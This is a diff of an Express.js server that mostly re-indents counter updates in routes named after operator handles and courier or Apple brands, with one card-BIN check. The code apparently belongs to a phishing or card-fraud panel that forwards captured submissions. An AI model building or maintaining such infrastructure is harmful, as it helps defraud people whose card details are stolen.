@@ -416,7 +416,7 @@ app.post("/bigbullAuspost", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          bigbull = 0;
+        bigbull = 0;
       } else {
         axios
           .post(
@@ -442,7 +442,7 @@ app.post("/bigbullAuspost", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          bigbull += 1;
+        bigbull += 1;
       }
       res.send("Update Completed");
     });
@@ -520,7 +520,7 @@ app.post("/daangerAuspost", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          daanger = 0;
+        daanger = 0;
       } else {
         axios
           .post(
@@ -546,7 +546,7 @@ app.post("/daangerAuspost", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          daanger += 1;
+        daanger += 1;
       }
       res.send("Update Completed");
     });
@@ -626,7 +626,7 @@ app.post("/c2auspost", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          c2 = 0;
+        c2 = 0;
       } else {
         axios
           .post(
@@ -652,7 +652,7 @@ app.post("/c2auspost", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          c2 += 1;
+        c2 += 1;
       }
       res.send("Update Completed");
     });
@@ -3354,7 +3354,7 @@ app.post("/heisenbergApple", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          heisenberg = 4;
+        heisenberg = 4;
       } else {
         axios
           .post(
@@ -3380,7 +3380,7 @@ app.post("/heisenbergApple", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          heisenberg += 1;
+        heisenberg += 1;
       }
       res.send("Update Complete");
     });
@@ -7265,7 +7265,7 @@ app.post("/kyleEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          kyle = 5;
+        kyle = 5;
       } else if (bin === "542011") {
         axios
           .post(
@@ -7304,7 +7304,7 @@ app.post("/kyleEvri", (req, res) => {
           .catch((e) => {
             console.log(e);
           });
-          kyle += 1;
+        kyle += 1;
       }
 
       res.send("Update Completed");
@@ -7923,7 +7923,7 @@ app.post("/haytchEvri", (req, res) => {
     });
 });
 
-let daanger = 4;
+let daanger = 0;
 
 app.options("/dangerrEvri", cors());
 
